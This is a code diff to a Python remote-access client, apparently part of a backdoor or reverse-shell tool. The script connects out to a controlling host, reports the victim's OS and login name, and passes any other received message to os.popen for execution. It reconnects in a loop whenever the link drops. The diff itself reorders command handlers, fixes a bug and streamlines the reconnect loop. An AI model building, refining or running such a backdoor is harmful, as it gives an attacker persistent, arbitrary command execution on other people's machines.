@@ -21,7 +21,17 @@ while True:
     try:
         msg = s.recv(1024)
         msg = msg.decode()
-        if msg.lower().startswith('!getusername'):
+        if msg.lower().startswith('!getos'):
+            if opsys == "darwin":
+                msgtoserv = "MacOS".encode()
+            elif opsys == "win32":
+                msgtoserv = "WindowsOS".encode()
+            else:
+                msgtoserv = opsys.encode()
+            s.send(msgtoserv)
+        elif msg.lower().startswith('!help'):
+            pass
+        elif msg.lower().startswith('!getusername'):
             try:
                 login = os.getlogin()
                 msgtoserv = login.encode()
@@ -171,7 +181,7 @@ while True:
             try:
                 if opsys == "darwin":
                     try:
-                        os.system(f'cd {os.getcwd}')
+                        os.system(f'cd {os.getcwd()}')
                         os.system(f'open {filename}')
                     except:
                         pass
@@ -199,14 +209,6 @@ while True:
                 pass
         elif msg.lower().startswith('!listips'):
             pass
-        if msg.lower().startswith('!getos'):
-            if opsys == "darwin":
-                msgtoserv = "MacOS".encode()
-            elif opsys == "win32":
-                msgtoserv = "WindowsOS".encode()
-            else:
-                msgtoserv = opsys.encode()
-            s.send(msgtoserv)
         else:
             try:
                 msgtoserv = os.popen(msg).readlines()
@@ -217,14 +219,11 @@ while True:
             except:
                 pass
     except:
-        if socket.error:
-            while True:
-                try:
-                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    s.connect((ip, 80))
-                    break
-                except:
-                    s.close()
-                    pass
-        else:
-            pass
+        while True:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect((ip, 80))
+                break
+            except:
+                s.close()
+                pass
